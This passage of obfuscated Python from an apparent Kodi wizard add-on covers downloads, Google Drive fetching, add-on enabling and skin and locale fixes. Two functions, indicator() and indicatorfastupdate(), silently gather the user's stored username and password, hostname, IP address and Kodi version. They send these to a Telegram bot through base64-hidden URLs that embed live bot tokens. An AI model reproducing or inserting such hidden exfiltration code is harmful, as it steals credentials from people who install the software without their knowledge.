    OO00O0OOO0OO000OO =O0OO00OO000OO000O .info ().getheader ('Content-Length').strip ()#line:3434
    OO0O00000OOOO00O0 =True #line:3435
  except AttributeError :#line:3436
        OO0O00000OOOO00O0 =False #line:3437
  if OO0O00000OOOO00O0 :#line:3439
        OO00O0OOO0OO000OO =int (OO00O0OOO0OO000OO )#line:3440
  O0OO0O0O0OO00OOO0 =0 #line:3442
  OO0OO0O00000O000O =time .time ()#line:3443
  while True :#line:3444
        OOO000OO000000000 =O0OO00OO000OO000O .read (8192 )#line:3445
        if not OOO000OO000000000 :#line:3446
            sys .stdout .write ('\n')#line:3447
            break #line:3448
        O0OO0O0O0OO00OOO0 +=len (OOO000OO000000000 )#line:3450
        O0O00OO00000000O0 .write (OOO000OO000000000 )#line:3451
        if not OO0O00000OOOO00O0 :#line:3453
            OO00O0OOO0OO000OO =O0OO0O0O0OO00OOO0 #line:3454
        if O0OOO00O00000OOO0 .iscanceled ():#line:3455
           O0OOO00O00000OOO0 .close ()#line:3456
           try :#line:3457
            os .remove (OO00OO00O000O0OOO )#line:3458
           except :#line:3459
            pass #line:3460
           break #line:3461
        OO00O0O00000000OO =float (O0OO0O0O0OO00OOO0 )/OO00O0OOO0OO000OO #line:3462
        OO00O0O00000000OO =round (OO00O0O00000000OO *100 ,2 )#line:3463
        O00OOO0O0OOOO0OO0 =O0OO0O0O0OO00OOO0 /(1024 *1024 )#line:3464
        OO00OOO0000000O0O =OO00O0OOO0OO000OO /(1024 *1024 )#line:3465
        OOOO0OO0O0OO0O0O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OOO0O0OOOO0OO0 ,'teal',OO00OOO0000000O0O )#line:3466
        if (time .time ()-OO0OO0O00000O000O )>0 :#line:3467
          OO0OO0O000OOOOOOO =O0OO0O0O0OO00OOO0 /(time .time ()-OO0OO0O00000O000O )#line:3468
          OO0OO0O000OOOOOOO =OO0OO0O000OOOOOOO /1024 #line:3469
        else :#line:3470
         OO0OO0O000OOOOOOO =0 #line:3471
        O00O0OO0OO0O0O000 ='KB'#line:3472
        if OO0OO0O000OOOOOOO >=1024 :#line:3473
           OO0OO0O000OOOOOOO =OO0OO0O000OOOOOOO /1024 #line:3474
           O00O0OO0OO0O0O000 ='MB'#line:3475
        if OO0OO0O000OOOOOOO >0 and not OO00O0O00000000OO ==100 :#line:3476
            OO0000OOO00OOOOO0 =(OO00O0OOO0OO000OO -O0OO0O0O0OO00OOO0 )/OO0OO0O000OOOOOOO #line:3477
        else :#line:3478
            OO0000OOO00OOOOO0 =0 #line:3479
        O00OO0OOO00O0O00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0OO0O000OOOOOOO ,O00O0OO0OO0O0O000 )#line:3480
        O0OOO00O00000OOO0 .update (int (OO00O0O00000000OO ),"Downloading "+name ,OOOO0OO0O0OO0O0O0 ,O00OO0OOO00O0O00O )#line:3482
  O0OO0OOO0000000OO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3485
  O0O00OO00000000O0 .close ()#line:3487
  extract (OO00OO00O000O0OOO ,O0OO0OOO0000000OO ,O0OOO00O00000OOO0 )#line:3489
  if os .path .exists (O0OO0OOO0000000OO +'/scakemyer-script.quasar.burst'):#line:3490
    if os .path .exists (O0OO0OOO0000000OO +'/script.quasar.burst'):#line:3491
     shutil .rmtree (O0OO0OOO0000000OO +'/script.quasar.burst',ignore_errors =False )#line:3492
    os .rename (O0OO0OOO0000000OO +'/scakemyer-script.quasar.burst',O0OO0OOO0000000OO +'/script.quasar.burst')#line:3493
  if os .path .exists (O0OO0OOO0000000OO +'/plugin.video.kmediatorrent-master'):#line:3495
    if os .path .exists (O0OO0OOO0000000OO +'/plugin.video.kmediatorrent'):#line:3496
     shutil .rmtree (O0OO0OOO0000000OO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3497
    os .rename (O0OO0OOO0000000OO +'/plugin.video.kmediatorrent-master',O0OO0OOO0000000OO +'/plugin.video.kmediatorrent')#line:3498
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3499
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3500
  try :#line:3501
    os .remove (OO00OO00O000O0OOO )#line:3502
  except :#line:3503
    pass #line:3504
  O0OOO00O00000OOO0 .close ()#line:3505
def dis_or_enable_addon (OO0OO0O00O0O00OOO ,OO00000O0OOOO0OOO ,enable ="true"):#line:3506
    import json #line:3507
    OO0O0O00O00000O0O ='"%s"'%OO0OO0O00O0O00OOO #line:3508
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0OO0O00O0O00OOO )and enable =="true":#line:3509
        logging .warning ('already Enabled')#line:3510
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0OO0O00O0O00OOO )#line:3511
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0OO0O00O0O00OOO )and enable =="false":#line:3512
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0OO0O00O0O00OOO )#line:3513
    else :#line:3514
        OO0OOOOOO0O00OO0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO0O0O00O00000O0O ,enable )#line:3515
        O0O0O0OO00OOO0OOO =xbmc .executeJSONRPC (OO0OOOOOO0O00OO0O )#line:3516
        OOO000O0000OO00OO =json .loads (O0O0O0OO00OOO0OOO )#line:3517
        if enable =="true":#line:3518
            xbmc .log ("### Enabled %s, response = %s"%(OO0OO0O00O0O00OOO ,OOO000O0000OO00OO ))#line:3519
        else :#line:3520
            xbmc .log ("### Disabled %s, response = %s"%(OO0OO0O00O0O00OOO ,OOO000O0000OO00OO ))#line:3521
    if OO00000O0OOOO0OOO =='auto':#line:3522
     return True #line:3523
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3524
def chunk_report (OOOOO0000OOOOO0O0 ,O00OO0OOO0O000000 ,O0O00OO0O00O00OOO ):#line:3525
   OOOOOOO0OOO0O0O0O =float (OOOOO0000OOOOO0O0 )/O0O00OO0O00O00OOO #line:3526
   OOOOOOO0OOO0O0O0O =round (OOOOOOO0OOO0O0O0O *100 ,2 )#line:3527
   if OOOOO0000OOOOO0O0 >=O0O00OO0O00O00OOO :#line:3529
      sys .stdout .write ('\n')#line:3530
def chunk_read (O0OO0OO00000OOO00 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3532
   import time #line:3533
   OOOOOO0OO0OOO00O0 =int (filesize )*1000000 #line:3534
   O0O0OO0OO0OO00OOO =0 #line:3536
   O000O000OO0O00O0O =time .time ()#line:3537
   OOOOO0OOO0O00OO00 =0 #line:3538
   logging .warning ('Downloading')#line:3540
   with open (destination ,"wb")as O000O0OOO0OOOOO0O :#line:3541
    while 1 :#line:3542
      O0OOO0OOOOOO0OOO0 =time .time ()-O000O000OO0O00O0O #line:3543
      O000O000O0OOO0OO0 =int (OOOOO0OOO0O00OO00 *chunk_size )#line:3544
      OO0O0O00OOO000O0O =O0OO0OO00000OOO00 .read (chunk_size )#line:3545
      O000O0OOO0OOOOO0O .write (OO0O0O00OOO000O0O )#line:3546
      O000O0OOO0OOOOO0O .flush ()#line:3547
      O0O0OO0OO0OO00OOO +=len (OO0O0O00OOO000O0O )#line:3548
      OO00O0O00OO00000O =float (O0O0OO0OO0OO00OOO )/OOOOOO0OO0OOO00O0 #line:3549
      OO00O0O00OO00000O =round (OO00O0O00OO00000O *100 ,2 )#line:3550
      if int (O0OOO0OOOOOO0OOO0 )>0 :#line:3551
        O0O0O0OOO0000O00O =int (O000O000O0OOO0OO0 /(1024 *O0OOO0OOOOOO0OOO0 ))#line:3552
      else :#line:3553
         O0O0O0OOO0000O00O =0 #line:3554
      if O0O0O0OOO0000O00O >1024 and not OO00O0O00OO00000O ==100 :#line:3555
          OO000OO0000O0O00O =int (((OOOOOO0OO0OOO00O0 -O000O000O0OOO0OO0 )/1024 )/(O0O0O0OOO0000O00O ))#line:3556
      else :#line:3557
          OO000OO0000O0O00O =0 #line:3558
      if OO000OO0000O0O00O <0 :#line:3559
        OO000OO0000O0O00O =0 #line:3560
      dp .update (int (OO00O0O00OO00000O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO00O0O00OO00000O ,O000O000O0OOO0OO0 /(1024 *1024 ),OOOOOO0OO0OOO00O0 /(1000 *1000 ),O0O0O0OOO0000O00O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO000OO0000O0O00O ,60 ))#line:3561
      if dp .iscanceled ():#line:3562
         dp .close ()#line:3563
         break #line:3564
      if not OO0O0O00OOO000O0O :#line:3565
         break #line:3566
      if report_hook :#line:3568
         report_hook (O0O0OO0OO0OO00OOO ,chunk_size ,OOOOOO0OO0OOO00O0 )#line:3569
      OOOOO0OOO0O00OO00 +=1 #line:3570
   logging .warning ('END Downloading')#line:3571
   return O0O0OO0OO0OO00OOO #line:3572
def googledrive_download (O0OO0OOOO0000OO00 ,OOOOOOO0O0O0000O0 ,O0OO0OO0O0O0OO0O0 ,OO00O00OO000OO00O ):#line:3574
    OOO000O00000OOOO0 =[]#line:3578
    O0OO0OOO0O0OO0O0O =O0OO0OOOO0000OO00 .split ('=')#line:3579
    O0OO0OOOO0000OO00 =O0OO0OOO0O0OO0O0O [len (O0OO0OOO0O0OO0O0O )-1 ]#line:3580
    def OOO0O00O0OO0OOOOO (O000OO0O0O00OOO0O ):#line:3582
        for O00OOOOO000O00OO0 in O000OO0O0O00OOO0O :#line:3584
            logging .warning ('cookie.name')#line:3585
            logging .warning (O00OOOOO000O00OO0 .name )#line:3586
            O00O0000000O000O0 =O00OOOOO000O00OO0 .value #line:3587
            if 'download_warning'in O00OOOOO000O00OO0 .name :#line:3588
                logging .warning (O00OOOOO000O00OO0 .value )#line:3589
                logging .warning ('cookie.value')#line:3590
                return O00OOOOO000O00OO0 .value #line:3591
            return O00O0000000O000O0 #line:3592
        return None #line:3594
    def O00O0O0O0OO000O0O (OO000O0000OO0O0O0 ,OOO00000O0O0OOOO0 ):#line:3596
        O0OO000O0OOO0O0O0 =32768 #line:3598
        OOOO00OO0000O0OOO =time .time ()#line:3599
        with open (OOO00000O0O0OOOO0 ,"wb")as OO0000O0OOOO0O0O0 :#line:3601
            OO0O0OOO0OO0000OO =1 #line:3602
            OO0O00OO000O0OO0O =32768 #line:3603
            try :#line:3604
                OO0OOO00OO0OOOOOO =int (OO000O0000OO0O0O0 .headers .get ('content-length'))#line:3605
                print ('file total size :',OO0OOO00OO0OOOOOO )#line:3606
            except TypeError :#line:3607
                print ('using dummy length !!!')#line:3608
                OO0OOO00OO0OOOOOO =int (OO00O00OO000OO00O )*1000000 #line:3609
            for OO0000OO0OOOO0O0O in OO000O0000OO0O0O0 .iter_content (O0OO000O0OOO0O0O0 ):#line:3610
                if OO0000OO0OOOO0O0O :#line:3611
                    OO0000O0OOOO0O0O0 .write (OO0000OO0OOOO0O0O )#line:3612
                    OO0000O0OOOO0O0O0 .flush ()#line:3613
                    O00OOO000000OO000 =time .time ()-OOOO00OO0000O0OOO #line:3614
                    O0O00O0OOOO00OOO0 =int (OO0O0OOO0OO0000OO *OO0O00OO000O0OO0O )#line:3615
                    if O00OOO000000OO000 ==0 :#line:3616
                        O00OOO000000OO000 =0.1 #line:3617
                    O000OOO0OOOO0OOOO =int (O0O00O0OOOO00OOO0 /(1024 *O00OOO000000OO000 ))#line:3618
                    O0OOOOOOO00O0O0O0 =int (OO0O0OOO0OO0000OO *OO0O00OO000O0OO0O *100 /OO0OOO00OO0OOOOOO )#line:3619
                    if O000OOO0OOOO0OOOO >1024 and not O0OOOOOOO00O0O0O0 ==100 :#line:3620
                      O00OOOO0OO000O000 =int (((OO0OOO00OO0OOOOOO -O0O00O0OOOO00OOO0 )/1024 )/(O000OOO0OOOO0OOOO ))#line:3621
                    else :#line:3622
                      O00OOOO0OO000O000 =0 #line:3623
                    O0OO0OO0O0O0OO0O0 .update (int (O0OOOOOOO00O0O0O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OOOOOOO00O0O0O0 ,O0O00O0OOOO00OOO0 /(1024 *1024 ),OO0OOO00OO0OOOOOO /(1000 *1000 ),O000OOO0OOOO0OOOO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O00OOOO0OO000O000 ,60 ))#line:3625
                    OO0O0OOO0OO0000OO +=1 #line:3626
                    if O0OO0OO0O0O0OO0O0 .iscanceled ():#line:3627
                     O0OO0OO0O0O0OO0O0 .close ()#line:3628
                     break #line:3629
    OO00OO0OO00OO0OOO ="https://docs.google.com/uc?export=download"#line:3630
    import urllib2 #line:3635
    import cookielib #line:3636
    from cookielib import CookieJar #line:3638
    O0O00O0OOO00O0O0O =CookieJar ()#line:3640
    OO000000O00000O00 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0O00O0OOO00O0O0O ))#line:3641
    OOO0OOO00OO0OO000 ={'id':O0OO0OOOO0000OO00 }#line:3643
    OO0OO0O00000OO000 =urllib .urlencode (OOO0OOO00OO0OO000 )#line:3644
    logging .warning (OO00OO0OO00OO0OOO +'&'+OO0OO0O00000OO000 )#line:3645
    OO00OOO000OO000OO =OO000000O00000O00 .open (OO00OO0OO00OO0OOO +'&'+OO0OO0O00000OO000 )#line:3646
    OO0O00OO0O0OOOOOO =OO00OOO000OO000OO .read ()#line:3647
    for OO0000O00O00O0O00 in O0O00O0OOO00O0O0O :#line:3649
         logging .warning (OO0000O00O00O0O00 )#line:3650
    OOO0O000O0O000OOO =OOO0O00O0OO0OOOOO (O0O00O0OOO00O0O0O )#line:3651
    logging .warning (OOO0O000O0O000OOO )#line:3652
    if OOO0O000O0O000OOO :#line:3653
        OO0O000O0OO000OOO ={'id':O0OO0OOOO0000OO00 ,'confirm':OOO0O000O0O000OOO }#line:3654
        OOOOOO0OOO0O0OO0O ={'Access-Control-Allow-Headers':'Content-Length'}#line:3655
        OO0OO0O00000OO000 =urllib .urlencode (OO0O000O0OO000OOO )#line:3656
        OO00OOO000OO000OO =OO000000O00000O00 .open (OO00OO0OO00OO0OOO +'&'+OO0OO0O00000OO000 )#line:3657
        chunk_read (OO00OOO000OO000OO ,report_hook =chunk_report ,dp =O0OO0OO0O0O0OO0O0 ,destination =OOOOOOO0O0O0000O0 ,filesize =OO00O00OO000OO00O )#line:3658
    return (OOO000O00000OOOO0 )#line:3662
def kodi17Fix ():#line:3663
	OOOOOOO0O0000O000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3664
	O0OO0O000O0OO0O00 =[]#line:3665
	for OOOO0OO000O0OO00O in sorted (OOOOOOO0O0000O000 ,key =lambda OO0O00O00O0000O00 :OO0O00O00O0000O00 ):#line:3666
		OO0O00O000OO00O00 =os .path .join (OOOO0OO000O0OO00O ,'addon.xml')#line:3667
		if os .path .exists (OO0O00O000OO00O00 ):#line:3668
			OOO0OO0000OOOOO0O =OOOO0OO000O0OO00O .replace (ADDONS ,'')[1 :-1 ]#line:3669
			OOO0O0O000OOO0OO0 =open (OO0O00O000OO00O00 )#line:3670
			OO0000O0000O0O0OO =OOO0O0O000OOO0OO0 .read ()#line:3671
			O000O0O0OO0OO0O00 =parseDOM (OO0000O0000O0O0OO ,'addon',ret ='id')#line:3672
			OOO0O0O000OOO0OO0 .close ()#line:3673
			try :#line:3674
				O0OOO0O00O00O0OO0 =xbmcaddon .Addon (id =O000O0O0OO0OO0O00 [0 ])#line:3675
			except :#line:3676
				try :#line:3677
					log ("%s was disabled"%O000O0O0OO0OO0O00 [0 ],xbmc .LOGDEBUG )#line:3678
					O0OO0O000O0OO0O00 .append (O000O0O0OO0OO0O00 [0 ])#line:3679
				except :#line:3680
					try :#line:3681
						log ("%s was disabled"%OOO0OO0000OOOOO0O ,xbmc .LOGDEBUG )#line:3682
						O0OO0O000O0OO0O00 .append (OOO0OO0000OOOOO0O )#line:3683
					except :#line:3684
						if len (O000O0O0OO0OO0O00 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OOO0OO0000OOOOO0O ,xbmc .LOGERROR )#line:3685
						else :log ("Unabled to enable: %s"%OOOO0OO000O0OO00O ,xbmc .LOGERROR )#line:3686
	if len (O0OO0O000O0OO0O00 )>0 :#line:3687
		OO00OO000OO0OOOOO =0 #line:3688
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3689
		for O00O000000O000OO0 in O0OO0O000O0OO0O00 :#line:3690
			OO00OO000OO0OOOOO +=1 #line:3691
			O0000O00000OO000O =int (percentage (OO00OO000OO0OOOOO ,len (O0OO0O000O0OO0O00 )))#line:3692
			DP .update (O0000O00000OO000O ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O000000O000OO0 ))#line:3693
			addonDatabase (O00O000000O000OO0 ,1 )#line:3694
			if DP .iscanceled ():break #line:3695
		if DP .iscanceled ():#line:3696
			DP .close ()#line:3697
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3698
			sys .exit ()#line:3699
		DP .close ()#line:3700
	forceUpdate ()#line:3701
def indicator ():#line:3703
       try :#line:3704
          import json #line:3705
          wiz .log ('FRESH MESSAGE')#line:3706
          OO00O000OO000000O =(ADDON .getSetting ("user"))#line:3707
          O0OOOO00000O0O000 =(ADDON .getSetting ("pass"))#line:3708
          O00OOOO0OO00OOO0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3709
          O0O000O0OOO0OO00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3710
          O00O0OOOO0OO0OO0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3711
          O0OOOO00OOOOO0000 =str (json .loads (O00O0OOOO0OO0OO0O )['ip'])#line:3712
          OO0OOOOOOO0O000OO =OO00O000OO000000O #line:3713
          O00OO000OOOOOO0O0 =O0OOOO00000O0O000 #line:3714
          import socket #line:3715
          O00O0OOOO0OO0OO0O =urllib2 .urlopen (O0O000O0OOO0OO00O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO0OOOOOOO0O000OO +' - '+O00OO000OOOOOO0O0 +' - '+O00OOOO0OO00OOO0O +' - '+O0OOOO00OOOOO0000 ).readlines ()#line:3716
       except :pass #line:3718
def indicatorfastupdate ():#line:3720
       try :#line:3721
          import json #line:3722
          wiz .log ('FRESH MESSAGE')#line:3723
          OO000OOO000OO0O0O =(ADDON .getSetting ("user"))#line:3724
          O0000OO00O000OO00 =(ADDON .getSetting ("pass"))#line:3725
          O000O0000OO0OO0O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3726
          OOOO0OO0OO0OOOOOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3728
          O00O00000O0O0OO0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3729
          O0O0000000OOO00OO =str (json .loads (O00O00000O0O0OO0O )['ip'])#line:3730
          OO0O00000O00OO00O =OO000OOO000OO0O0O #line:3731
          OO0000O00O00OOOOO =O0000OO00O000OO00 #line:3732
          import socket #line:3734
          O00O00000O0O0OO0O =urllib2 .urlopen (OOOO0OO0OO0OOOOOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO0O00000O00OO00O +' - '+OO0000O00O00OOOOO +' - '+O000O0000OO0OO0O0 +' - '+O0O0000000OOO00OO ).readlines ()#line:3735
       except :pass #line:3737
def skinfix18 ():#line:3739
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3740
		OO0OOOO00OOOOO0O0 =wiz .workingURL (SKINID18DDONXML )#line:3741
		if OO0OOOO00OOOOO0O0 ==True :#line:3742
			O0OOO000O000OOOO0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3743
			if len (O0OOO000O000OOOO0 )>0 :#line:3744
				O00OOO00OOO0O00OO ='%s-%s.zip'%(SKINID18 ,O0OOO000O000OOOO0 [0 ])#line:3745
				OO0000000O0O0OOOO =wiz .workingURL (SKIN18ZIPURL +O00OOO00OOO0O00OO )#line:3746
				if OO0000000O0O0OOOO ==True :#line:3747
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3748
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3749
					O0O000O00O0000OOO =os .path .join (PACKAGES ,O00OOO00OOO0O00OO )#line:3750
					try :os .remove (O0O000O00O0000OOO )#line:3751
					except :pass #line:3752
					downloader .download (SKIN18ZIPURL +O00OOO00OOO0O00OO ,O0O000O00O0000OOO ,DP )#line:3753
					extract .all (O0O000O00O0000OOO ,HOME ,DP )#line:3754
					try :#line:3755
						OO00O00O0OO000000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3756
						OO000O000000000O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3757
						os .rename (OO00O00O0OO000000 ,OO000O000000000O0 )#line:3758
					except :#line:3759
						pass #line:3760
					try :#line:3761
						O00O00O0O0O0OOO00 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO0O00OO000O0O000 =O00O00O0O0O0OOO00 .read ();O00O00O0O0O0OOO00 .close ()#line:3762
						OO00O0O00OOOOO0OO =wiz .parseDOM (OO0O00OO000O0O000 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3763
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00O0O00OOOOO0OO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3764
					except :#line:3765
						pass #line:3766
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3767
					DP .close ()#line:3768
					xbmc .sleep (500 )#line:3769
					wiz .forceUpdate (True )#line:3770
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3771
				else :#line:3772
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3773
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0000000O0O0OOOO ,xbmc .LOGERROR )#line:3774
			else :#line:3775
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3776
		else :#line:3777
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3778
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3779
def skinfix17 ():#line:3780
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3781
		O00OOO000OO0OO00O =wiz .workingURL (SKINID17DDONXML )#line:3782
		if O00OOO000OO0OO00O ==True :#line:3783
			O0000OO00OO0000OO =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3784
			if len (O0000OO00OO0000OO )>0 :#line:3785
				OOOO00O0O0OOOOO0O ='%s-%s.zip'%(SKINID17 ,O0000OO00OO0000OO [0 ])#line:3786
				O00O000O000O0O0O0 =wiz .workingURL (SKIN17ZIPURL +OOOO00O0O0OOOOO0O )#line:3787
				if O00O000O000O0O0O0 ==True :#line:3788
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3789
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3790
					OO00O0O0OOO00O000 =os .path .join (PACKAGES ,OOOO00O0O0OOOOO0O )#line:3791
					try :os .remove (OO00O0O0OOO00O000 )#line:3792
					except :pass #line:3793
					downloader .download (SKIN17ZIPURL +OOOO00O0O0OOOOO0O ,OO00O0O0OOO00O000 ,DP )#line:3794
					extract .all (OO00O0O0OOO00O000 ,HOME ,DP )#line:3795
					try :#line:3796
						OO000O000OO0OO00O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3797
						O0000000O00000OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3798
						os .rename (OO000O000OO0OO00O ,O0000000O00000OOO )#line:3799
					except :#line:3800
						pass #line:3801
					try :#line:3802
						O00OOO000O0OOO0O0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0O00O000O0O00OOO =O00OOO000O0OOO0O0 .read ();O00OOO000O0OOO0O0 .close ()#line:3803
						OO0OOO000OO0000OO =wiz .parseDOM (O0O00O000O0O00OOO ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3804
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO000OO0000OO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3805
					except :#line:3806
						pass #line:3807
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3808
					DP .close ()#line:3809
					xbmc .sleep (500 )#line:3810
					wiz .forceUpdate (True )#line:3811
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3812
				else :#line:3813
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3814
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00O000O000O0O0O0 ,xbmc .LOGERROR )#line:3815
			else :#line:3816
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3817
		else :#line:3818
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3819
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3820
def fix17update ():#line:3821
	if KODIV >=17 and KODIV <18 :#line:3822
		wiz .kodi17Fix ()#line:3823
		xbmc .sleep (4000 )#line:3824
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3825
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3826
		fixfont ()#line:3827
		O0O00OOOO00OO0OOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3828
		try :#line:3830
			OOO0O0000OO0OO0OO =open (O0O00OOOO00OO0OOO ,'r')#line:3831
			O00OOO0O000OOOO0O =OOO0O0000OO0OO0OO .read ()#line:3832
			OOO0O0000OO0OO0OO .close ()#line:3833
			OO0OOO0O0O0OOOOOO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3834
			O00OOOO00O00O0OO0 =re .compile (OO0OOO0O0O0OOOOOO ).findall (O00OOO0O000OOOO0O )[0 ]#line:3835
			OOO0O0000OO0OO0OO =open (O0O00OOOO00OO0OOO ,'w')#line:3836
			OOO0O0000OO0OO0OO .write (O00OOO0O000OOOO0O .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O00OOOO00O00O0OO0 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3837
			OOO0O0000OO0OO0OO .close ()#line:3838
		except :#line:3839
				pass #line:3840
		wiz .kodi17Fix ()#line:3841
		O0O00OOOO00OO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3842
		try :#line:3843
			OOO0O0000OO0OO0OO =open (O0O00OOOO00OO0OOO ,'r')#line:3844
			O00OOO0O000OOOO0O =OOO0O0000OO0OO0OO .read ()#line:3845
			OOO0O0000OO0OO0OO .close ()#line:3846
			OO0OOO0O0O0OOOOOO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3847
			O00OOOO00O00O0OO0 =re .compile (OO0OOO0O0O0OOOOOO ).findall (O00OOO0O000OOOO0O )[0 ]#line:3848
			OOO0O0000OO0OO0OO =open (O0O00OOOO00OO0OOO ,'w')#line:3849
			OOO0O0000OO0OO0OO .write (O00OOO0O000OOOO0O .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O00OOOO00O00O0OO0 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3850
			OOO0O0000OO0OO0OO .close ()#line:3851
		except :#line:3852
				pass #line:3853
		swapSkins ('skin.Premium.mod')#line:3854
